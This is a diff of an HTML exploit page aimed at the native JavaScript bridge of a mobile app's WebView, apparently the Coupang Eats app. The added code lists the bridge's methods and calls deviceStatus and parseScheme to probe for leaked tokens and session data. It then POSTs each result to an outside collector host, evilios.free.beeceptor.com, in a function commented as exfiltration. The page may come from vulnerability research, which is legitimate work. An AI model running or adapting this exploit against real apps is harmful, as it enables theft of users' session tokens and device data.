@@ -3,66 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vulnerability Validation Proof of Concept</title>
+    <title>JS Bridge Token Extraction Test</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; background-color: #f8f9fa; color: #212529; }
-        .container { max-width: 600px; margin: 0 auto; }
-        .alert { padding: 15px; margin-bottom: 20px; border: 1px solid transparent; border-radius: 4px; }
-        .alert-danger { color: #721c24; background-color: #f8d7da; border-color: #f5c6cb; }
-        .alert-success { color: #155724; background-color: #d4edda; border-color: #c3e6cb; }
-        .card { background: #fff; border: 1px solid #dee2e6; padding: 20px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
-        h2 { margin-top: 0; }
-        code { background: #e9ecef; padding: 2px 4px; border-radius: 4px; font-family: monospace; }
+        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 20px; background-color: #f4f6f9; color: #333; }
+        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px; }
+        .status { font-weight: bold; color: #007bff; }
+        pre { background: #272822; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; font-family: monospace; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="alert alert-danger">
-            <strong>Security Validation Page</strong><br>
-            If you see this page inside the application WebView, an arbitrary URL loading vulnerability exists.
-        </div>
 
-        <div class="card">
-            <h2>JavaScript Interface Verification</h2>
-            <p>Testing communication with the native bridge <code>messageHandlers</code>...</p>
-            <div id="status-box" class="alert alert-danger">Checking interface availability...</div>
-        </div>
+    <div class="card">
+        <h2>Interface Exfiltration Status</h2>
+        <p>Status: <span id="status" class="status">Initializing Test...</span></p>
+    </div>
+
+    <div class="card">
+        <h2>Console Output Log</h2>
+        <pre id="console-log">Monitoring bridge callbacks...</pre>
     </div>
 
     <script>
         const BEECEPTOR_URL = "https://evilios.free.beeceptor.com";
+        const logBox = document.getElementById('console-log');
+        const statusBox = document.getElementById('status');
+
+        function logToScreenAndServer(label, data) {
+            const message = `[${label}] ${JSON.stringify(data, null, 2)}`;
+            logBox.innerText += "\n" + message;
+            
+            // Exfiltrate the captured data back to Beeceptor
+            fetch(`${BEECEPTOR_URL}/extracted-data`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ event: label, details: data })
+            }).catch(err => console.error("Exfiltration failed", err));
+        }
 
         window.onload = function() {
-            const statusBox = document.getElementById('status-box');
+            // 1. Verify if the bridge exists
+            if (typeof window.messageHandlers === 'undefined') {
+                statusBox.innerText = "FAILED: 'messageHandlers' bridge not found.";
+                statusBox.style.color = "#dc3545";
+                return;
+            }
 
-            // Check if the native app bridge is present in our context
-            if (typeof window.messageHandlers !== 'undefined') {
-                statusBox.className = "alert alert-success";
-                statusBox.innerHTML = "<strong>SUCCESS:</strong> <code>messageHandlers</code> bridge detected inside this untrusted origin.<br>Attempting invocation...";
+            statusBox.innerText = "Bridge found. Probing methods...";
+            
+            // 2. Map out available methods for verification
+            const availableMethods = Object.getOwnPropertyNames(window.messageHandlers);
+            logToScreenAndServer("Bridge_Methods_Found", availableMethods);
 
-                // Execute a safe interface call to prove control over internal navigation
-                // This triggers the internal screen parsing logic to demonstrate capabilities
+            // 3. Try calling deviceStatus to see if it leaks tokens, preference variables, or session configuration strings
+            if (typeof window.messageHandlers.deviceStatus === 'function') {
                 try {
-                    window.messageHandlers.parseScheme("coupangeats://SomeInternalScreen");
+                    // Test with an empty configuration object to monitor what the native side returns
+                    const result = window.messageHandlers.deviceStatus("{}");
                     
-                    // Log the successful execution event back to your listener
-                    fetch(`${BEECEPTOR_URL}/js-interface-triggered`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            status: "Verified",
-                            message: "Successfully executed parseScheme from an external domain."
-                        })
-                    });
+                    // If the method returns data synchronously, log it
+                    if (result) {
+                        logToScreenAndServer("Synchronous_DeviceStatus_Return", result);
+                    } else {
+                        logToScreenAndServer("Action_Executed", "deviceStatus triggered. Check if app called an asynchronous callback.");
+                    }
                 } catch (e) {
-                    // Log execution failure if the method signature differs
-                    fetch(`${BEECEPTOR_URL}/js-interface-error`, {
-                        method: "POST",
-                        body: JSON.stringify({ error: e.message })
-                    });
+                    logToScreenAndServer("DeviceStatus_Execution_Error", e.message);
                 }
-            } else {
-                statusBox.innerHTML = "<strong>FAILED:</strong> <code>messageHandlers</code> is not available. Ensure the target activity handles this URL execution.";
+            }
+
+            // 4. Try probing updateUserPreference or scheme actions if documentation suggests they return state
+            if (typeof window.messageHandlers.parseScheme === 'function') {
+                try {
+                    // Test if triggering a native internal navigation broadcasts structural state data
+                    window.messageHandlers.parseScheme("coupangeats://test");
+                    logToScreenAndServer("ParseScheme_Executed", "Triggered test scheme.");
+                } catch (e) {
+                    logToScreenAndServer("ParseScheme_Error", e.message);
+                }
             }
         };
     </script>
